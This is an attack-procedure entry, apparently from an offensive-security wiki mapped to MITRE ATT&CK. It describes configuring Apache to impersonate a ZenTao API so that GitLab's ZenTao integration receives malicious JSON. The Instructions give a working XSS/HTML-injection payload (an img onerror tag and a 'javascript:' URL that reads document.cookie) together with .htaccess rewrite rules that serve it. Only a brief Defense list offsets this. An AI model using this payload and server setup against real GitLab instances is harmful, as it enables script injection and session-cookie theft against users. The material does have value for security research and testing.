---
id: 123e4567-e89b-12d3-a456-426614174006
name: Setup-Mock-ZenTao-Server-with-Apache
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.871Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - apache
  - mock-server
  - zentao
commands:
  - '[[commands/apache-rewritecond-match-api-requests]]'
  - '[[commands/apache-rewritrule-serve-malicious-json]]'
platforms:
  - Web
  - Linux
tools:
  - '[[tools/Apache]]'
  - '[[tools/ZenTao]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Setup-Mock-ZenTao-Server-with-Apache

## Summary

This procedure configures an Apache server to mimic a ZenTao API endpoint, serving malicious JSON payloads that enable HTML injection and XSS in GitLab's integration.

## Description

Using .htaccess rewrites, the server intercepts requests to /api.php/v1/issues and responds with JSON containing injected <img> tags in 'id' for HTML injection and javascript: URLs in 'url' for XSS execution when clicked.

## Requirements

1. Apache server with mod_rewrite enabled
2. Hosted malicious JSON file at /zentao/issue.json
3. Domain control for HTTPS (e.g., joaxcar.com)

## Defense

Defensive measures and detection strategies:

- Verify integration endpoints against known ZenTao instances
- Block or log requests to untrusted domains
- Use certificate pinning for integrations

## Objectives

1. Redirect API requests to payload file
2. Deliver unvalidated JSON with injections
3. Enable XSS chain completion

## Instructions

### Step 1: Prepare JSON Payload

**Context**: Create issue.json with malicious content.

No command; edit file to include {"id": "<img src=x onerror=alert(1) style='width:100%;height:100vh'>", "web_url": "javascript:alert(document.cookie)"}.

> Place at server root /zentao/issue.json.

### Step 2: Configure Rewrites

**Context**: Set up .htaccess to match and serve the payload.

Execute [[commands/apache-rewritecond-match-api-requests]] and [[commands/apache-rewritrule-serve-malicious-json]] in .htaccess:

```apache
RewriteCond %{REQUEST_URI} ^/api.php/v1/issues
RewriteRule .* /zentao/issue.json [L]
```

> Restart Apache if needed; test with curl https://joaxcar.com/api.php/v1/issues/story-1.

### Step 3: Verify Response

**Context**: Confirm malicious JSON is served.

Use curl to request endpoint.

> Expected: JSON with injected HTML and JS URL returned.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/apache-rewritecond-match-api-requests]]
- [[commands/apache-rewritrule-serve-malicious-json]]

## Tools Used

- [[tools/Apache]]
- [[tools/ZenTao]]

## Tags

- [[tools/Apache]]
- [[mock-server]]
- [[tools/ZenTao]]
